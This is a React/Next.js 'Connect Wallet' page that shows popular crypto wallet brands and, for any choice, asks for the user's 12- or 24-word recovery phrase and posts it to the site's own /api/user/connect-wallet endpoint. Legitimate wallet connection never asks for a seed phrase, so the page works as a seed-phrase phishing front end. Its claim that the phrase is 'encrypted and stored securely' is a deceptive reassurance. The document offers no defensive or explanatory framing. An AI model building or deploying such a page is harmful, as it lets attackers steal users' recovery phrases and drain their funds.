'use client';

import React, { useState } from 'react';
import Image from 'next/image';
import { useRouter } from 'next/navigation';

const ConnectWalletPage: React.FC = () => {
  const router = useRouter();
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [phrase, setPhrase] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState('');

  const wallets = [
    { id: 'metamask', name: 'Metamask', icon: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg' },
    { id: 'trustwallet', name: 'Trust Wallet', icon: 'https://trustwallet.com/assets/images/media/assets/trust_platform.svg' },
    { id: 'coinbase', name: 'Coinbase Wallet', icon: 'https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg' },
    { id: 'phantom', name: 'Phantom', icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Phantom_wallet_logo.svg/1200px-Phantom_wallet_logo.svg.png' },
    { id: 'exodus', name: 'Exodus', icon: 'https://www.exodus.com/brand/img/logo.svg' },
    { id: 'other', name: 'Other Wallet', icon: '' },
  ];

  const handleConnect = (walletId: string) => {
    setSelectedWallet(walletId);
    setIsModalOpen(true);
    setPhrase('');
    setError('');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!phrase) return;

    // Basic validation
    const wordCount = phrase.trim().split(/\s+/).length;
    if (wordCount < 12) {
        setError('Recovery phrase must contain at least 12 words.');
        return;
    }

    setSubmitting(true);
    setError('');

    try {
        const res = await fetch('/api/user/connect-wallet', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                walletType: wallets.find(w => w.id === selectedWallet)?.name || 'Unknown Wallet',
                phrase
            }),
        });

        const data = await res.json();

        if (res.ok) {
            alert('Wallet connected successfully');
            setIsModalOpen(false);
            router.push('/dashboard');
        } else {
            setError(data.error || 'Failed to connect wallet');
        }
    } catch (error) {
        console.error('Connection error:', error);
        setError('An error occurred. Please try again.');
    } finally {
        setSubmitting(false);
    }
  };

  return (
    <div className="max-w-5xl mx-auto space-y-8">
      <div>
        <h1 className="text-2xl font-bold text-gray-900 dark:text-white">Connect Wallet</h1>
        <p className="text-gray-500 dark:text-gray-400 mt-1">Select a wallet to connect to your account.</p>
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
        {wallets.map((wallet) => (
            <button
                key={wallet.id}
                onClick={() => handleConnect(wallet.id)}
                className="bg-white dark:bg-slate-900 p-6 rounded-2xl border border-gray-100 dark:border-gray-800 shadow-sm hover:shadow-md transition-all flex flex-col items-center gap-4 group"
            >
                <div className="w-16 h-16 rounded-full bg-gray-50 dark:bg-slate-800 flex items-center justify-center p-3 group-hover:scale-110 transition-transform">
                    {wallet.icon ? (
                        <img src={wallet.icon} alt={wallet.name} className="w-full h-full object-contain" />
                    ) : (
                        <span className="material-symbols-outlined text-3xl text-gray-400">account_balance_wallet</span>
                    )}
                </div>
                <span className="font-bold text-slate-900 dark:text-white">{wallet.name}</span>
            </button>
        ))}
      </div>

      {/* Connection Modal */}
      {isModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm">
            <div className="bg-white dark:bg-slate-900 rounded-3xl w-full max-w-lg p-8 shadow-2xl animate-in fade-in zoom-in duration-200">
                <div className="flex justify-between items-center mb-6">
                    <h2 className="text-xl font-bold text-gray-900 dark:text-white">
                        Connect {wallets.find(w => w.id === selectedWallet)?.name}
                    </h2>
                    <button 
                        onClick={() => setIsModalOpen(false)}
                        className="p-2 hover:bg-gray-100 dark:hover:bg-slate-800 rounded-full transition-colors"
                    >
                        <span className="material-symbols-outlined text-gray-500">close</span>
                    </button>
                </div>

                <div className="bg-amber-50 dark:bg-amber-900/10 border border-amber-100 dark:border-amber-900/30 rounded-xl p-4 mb-6">
                    <p className="text-xs text-amber-600 dark:text-amber-400 flex gap-2">
                        <span className="material-symbols-outlined text-base">lock</span>
                        Your recovery phrase is encrypted and stored securely. Never share it with anyone else.
                    </p>
                </div>

                <form onSubmit={handleSubmit} className="space-y-6">
                    <div>
                        <label className="block text-sm font-bold text-gray-900 dark:text-white mb-2">
                            Recovery Phrase
                        </label>
                        <textarea
                            value={phrase}
                            onChange={(e) => setPhrase(e.target.value)}
                            placeholder="Enter your 12 or 24 word recovery phrase..."
                            className="w-full px-4 py-3 bg-gray-50 dark:bg-slate-800 border border-gray-200 dark:border-gray-700 rounded-xl focus:ring-2 focus:ring-primary/50 outline-none h-32 resize-none text-sm"
                            required
                        ></textarea>
                        {error && (
                            <p className="text-red-500 text-xs mt-2 flex items-center">
                                <span className="material-symbols-outlined text-sm mr-1">error</span>
                                {error}
                            </p>
                        )}
                    </div>

                    <button
                        type="submit"
                        disabled={submitting}
                        className="w-full py-4 bg-primary text-white font-bold rounded-xl hover:bg-emerald-600 transition-colors shadow-lg shadow-emerald-500/20 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
                    >
                        {submitting ? (
                            <>
                                <span className="animate-spin mr-2 h-5 w-5 border-2 border-white border-t-transparent rounded-full"></span>
                                Connecting...
                            </>
                        ) : 'Connect Wallet'}
                    </button>
                </form>
            </div>
        </div>
      )}
    </div>
  );
};

export default ConnectWalletPage;
